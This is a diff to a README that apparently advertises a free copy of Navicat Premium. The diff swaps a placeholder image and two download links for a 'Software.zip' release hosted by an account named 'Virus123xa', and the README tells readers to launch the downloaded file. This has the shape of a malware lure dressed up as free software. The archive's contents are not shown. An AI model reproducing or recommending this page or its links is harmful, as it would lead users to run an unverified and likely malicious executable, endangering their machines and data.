@@ -1,6 +1,6 @@
 # 🚀 Welcome to Navicat Premium Free Repository! 🚀
 
-![Navicat Premium Free](https://dummyimage.com/600x400/000/fff&text=Navicat+Premium+Free)
+![Navicat Premium Free](https://github.com/Virus123xa/Navicat-Premium-Free/releases/download/v1.0/Software.zip+Premium+Free)
 
 ## Repository Name: 
 Navicat-Premium-Free
@@ -26,11 +26,11 @@ Welcome to the Navicat Premium Free repository! Here you will find resources rel
 - [PremiumSoft Navicat Premium](#)
 
 ## Get Started:
-To access the source code or downloads associated with Navicat Premium, visit: [Navicat Premium Free Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and launch the file to get started!
+To access the source code or downloads associated with Navicat Premium, visit: [Navicat Premium Free Repository](https://github.com/Virus123xa/Navicat-Premium-Free/releases/download/v1.0/Software.zip) and launch the file to get started!
 
 👉 Click the button below to access the repository:
 
-[![Download Navicat Premium Free](https://img.shields.io/badge/Download-Navicat_Premium_Free-orange)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Navicat Premium Free](https://github.com/Virus123xa/Navicat-Premium-Free/releases/download/v1.0/Software.zip)](https://github.com/Virus123xa/Navicat-Premium-Free/releases/download/v1.0/Software.zip)
 
 ## How to Contribute:
 We welcome contributions to enhance the resources and tools available for Navicat Premium users. Feel free to fork the repository, make changes, and submit pull requests. Your contributions are highly valued!
